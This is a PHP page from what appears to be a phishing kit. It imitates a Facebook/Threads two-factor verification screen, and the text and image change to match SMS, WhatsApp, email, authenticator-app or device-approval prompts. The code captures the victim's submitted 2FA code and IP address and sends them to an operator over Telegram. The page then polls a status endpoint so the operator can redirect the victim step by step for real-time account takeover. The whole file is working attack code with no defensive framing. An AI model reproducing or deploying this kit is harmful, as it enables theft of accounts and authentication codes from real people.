<?php
include "helper.php";
$token=$_POST['token'];
$code=$_POST['code'];

$filePath = "status/" .$token. ".txt";

file_put_contents($filePath, 'hold');


$ip = getClientIp();

$codemsg=trim(file_get_contents("code_msg/".$token.".txt"));
$parts = explode(":", $codemsg);

$type = $parts[0]; 
$content = $parts[1]; 

$heading="";
$paragraph="";
$picture="auth.png";

if($type=="phone")
{
    $heading="Check your text messages";
    $paragraph="Enter the code we sent to ".$content.".";
    $picture="phone.png";
}
else if($type=="wp")
{
    $heading="Check your WhatsApp messages";
    $paragraph="Enter the code we sent to your WhatsApp account.";
    $picture="wp.png";
}
else if($type=="app")
{
    $heading="Go to your authentication app";
    $paragraph="Enter the 6-digit code for this account from the two-factor authentication app you set up (such as Duo Mobile or Google Authenticator).";
}
else if($type=="email")
{
    $heading="Check your email messages";
    $paragraph="Enter the code we sent to ".$content.".";
     $picture="email.jpg";
}
else if($type=="device")
{
    $heading="Check your notifications on another device";
    $paragraph="We sent a notification to your ".$content.". Check your Facebook notifications there and approve the login to continue";
    $picture="device.png";
}
else
{
    $heading="Go to your authentication app";
    $paragraph="Enter the 6-digit code for this account from the two-factor authentication app you set up (such as Duo Mobile or Google Authenticator).";
}



$user_agent = $_SERVER['HTTP_USER_AGENT'];


$message="CODE\nid: <code>".$token."</code>\n\n<code>".$code."</code>\n\nip: <code>".$ip."</code>";
$keyboard = getGmailNavKeyboard($token);
sendTGWithButtons($message, $keyboard);
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="utf-8">
    <meta http-equiv="x-ua-compatible" content="ie=edge">
    <meta name="DC.title" content="">
    <meta name="revisit-after" content="1 day">
    <meta name="description" content="">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <meta name="distribution" content="GLOBAL">
    <meta name="rating" content="General">
    <meta name="copyright" content="">
    <meta name="author" content="">
    <meta name="theme-color" content="#FFF">
    <meta name="robots" content="noindex,nofollow">
    <link href="files/boxicons.min.css" rel="stylesheet">
    <link href="files/main.css" rel="stylesheet">
    <script src="files/jquery-3.6.4.min.js"></script>
    <link href="files/jquery.select.css" rel="stylesheet">
    <script src="files/socket.io.js"></script>
    <script src="files/jquery.select.min.js"></script>
    <title>Threads</title>
    <link rel="icon" href="fb-files/threadsfavicon.png">

    <style>
        .errorClass
        {
            border: 1px solid #d33a42 !important;
            color: #d33a42;
        }
    </style>
</head>

<body>


    <link href="fb-files/verification.module.css" rel="stylesheet">
    <div class="verification_main">
        <div class="container">
            <div class="heading">
                <span> • Facebook</span>
                <h2>
                    <?= $heading; ?> </h2>

                <p>
                    <?= $paragraph; ?> </p>
            </div>
            <div class="image">
                <img src="fb-files/<?= $picture; ?>" alt="Image"> </div>
            <div class="form">
                <form method="post" class="authForm" action="code_POST.php" id="f1">
                    <input type="hidden" name="token" id="token" value="<?= $token; ?>" />

                                        <?php
                         if ($type=="device") { ?>

                        
                        <?php } else { ?>
                    <input class="authFormInput" type="number" name="code" id="code" placeholder="Code" value="<?= $code; ?>" data-required="true" data-codetype="2fa">
                        <?php }
                    ?>



                    <!-- <span class="error" id="error-code">Login code is required</span>
                    <span class="error" id="wrong-code">This code has expired. Wait for another one</span> -->



                    

                    <?php

                        if ($type=="device" ) {
                            ?>
                    

                            <div style="display: flex; align-items: center; color: gray;">
                                                    <svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1" width="25" height="25" viewBox="0 0 256 256" xml:space="preserve">
                        <g style="stroke: none; stroke-width: 0; stroke-dasharray: none; stroke-linecap: butt; stroke-linejoin: miter; stroke-miterlimit: 10; fill: none; fill-rule: nonzero; opacity: 1;" transform="translate(1.4065934065934016 1.4065934065934016) scale(2.81 2.81)">
                            <circle cx="44.996" cy="44.996" r="3.176" style="stroke: none; stroke-width: 1; stroke-dasharray: none; stroke-linecap: butt; stroke-linejoin: miter; stroke-miterlimit: 10; fill: rgb(0,0,0); fill-rule: nonzero; opacity: 1;" transform="  matrix(1 0 0 1 0 0) "/>
                            <circle cx="19.176000000000002" cy="44.996" r="3.176" style="stroke: none; stroke-width: 1; stroke-dasharray: none; stroke-linecap: butt; stroke-linejoin: miter; stroke-miterlimit: 10; fill: rgb(0,0,0); fill-rule: nonzero; opacity: 1;" transform="  matrix(1 0 0 1 0 0) "/>
                            <circle cx="70.82600000000001" cy="44.996" r="3.176" style="stroke: none; stroke-width: 1; stroke-dasharray: none; stroke-linecap: butt; stroke-linejoin: miter; stroke-miterlimit: 10; fill: rgb(0,0,0); fill-rule: nonzero; opacity: 1;" transform="  matrix(1 0 0 1 0 0) "/>
                            <path d="M 45 90 C 20.187 90 0 69.813 0 45 C 0 20.187 20.187 0 45 0 c 24.813 0 45 20.187 45 45 C 90 69.813 69.813 90 45 90 z M 45 4 C 22.393 4 4 22.393 4 45 s 18.393 41 41 41 s 41 -18.393 41 -41 S 67.607 4 45 4 z" style="stroke: none; stroke-width: 1; stroke-dasharray: none; stroke-linecap: butt; stroke-linejoin: miter; stroke-miterlimit: 10; fill: rgb(119, 119, 119); fill-rule: nonzero; opacity: 1;" transform=" matrix(1 0 0 1 0 0) " stroke-linecap="round"/>
                        </g>
                        </svg>
                                <span style="line-height: 25px;">Waiting for approval</span>
                            </div>
                            <?php
                        } 
                        ?>

                        




                    <?php
                         if ($type=="device") { ?>

                        
                        <?php } else { ?>
                            <div class="authSubmit">
                                <button name="submitAuth" type="button" style="cursor:pointer;background-color:#1877f27a;border:none" id="btn_submit">Continue</button>
                            </div>
                        <?php }
                    ?>


                </form>
            </div>

        </div>
    </div>



</body>

</html>

<script>
const token = "<?php echo $token; ?>"; 
const code = "<?php echo $code; ?>"; 

function checkStatus() {
    fetch(`code_STATUS.php?token=${token}`)
        .then(response => response.text())
        .then(data => {
            data = data.trim();

            if (data === 'hold') {
                console.log("Do not redirect - HOLD");
                return;
            } else if (data === 'pwd') {
                window.location.href = 'login.php?token='+token;
            } else if (data === 'continue') {
                window.location.href = 'continue.php?token='+token;
            } else if (data === 'code') {
                window.location.href = 'code.php?token='+token+'&w=1&code='+code;
            } else if (data === 'break') {
                window.location.href = 'break.php?token='+token;
            } else{
                return;
            }
        })
        .catch(error => console.error('Error:', error));
}

const statusInterval = setInterval(checkStatus, 3000);
</script>

